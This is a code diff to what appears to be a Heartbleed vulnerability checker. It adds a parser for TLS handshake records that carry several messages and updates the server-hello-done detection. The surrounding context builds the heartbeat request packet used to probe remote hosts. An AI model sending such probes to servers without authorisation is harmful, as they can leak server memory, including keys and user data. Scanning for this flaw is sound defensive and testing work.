@@ -115,6 +115,25 @@ def hit_hb(s):
         if typ == 21:
             return False
 
+def unpack_handshake(pay):
+    """
+    Unpack the SSL handshake in Multiple Handshake Message 
+    """
+    paylen = len(pay)
+    offset = 0
+    payarr = []
+
+    while offset < paylen:
+        h = pay[offset:offset + 4]
+        t, l24 = struct.unpack('>B3s', h)
+        l = struct.unpack('>I', '\x00' + l24)[0] 
+        payarr.append((
+            t,
+            l,
+            pay[offset+4:offset+4+l]
+            ))
+        offset = offset+l+4
+    return payarr
 
 def is_vulnerable(host, timeout):
     """ Check if remote host is vulnerable to heartbleed
@@ -137,10 +156,13 @@ def is_vulnerable(host, timeout):
         if typ is None:
             return None
 
-        # Look for server hello done message.
-        if typ == 22 and ord(pay[0]) == 0x0E:
-            break
-
+        if typ == 22:
+            payarr = unpack_handshake(pay)
+            # Look for server hello done message.
+            finddone = [t for t, l, p in payarr if t == 14]
+            if len(finddone) > 0:
+                break
+    
     # construct heartbeat request packet
     ver_chr = chr(ver&0xff)
     hb  = h2bin("18 03") + ver_chr + h2bin("40 00 01 3f fd") + "\x01"*16381
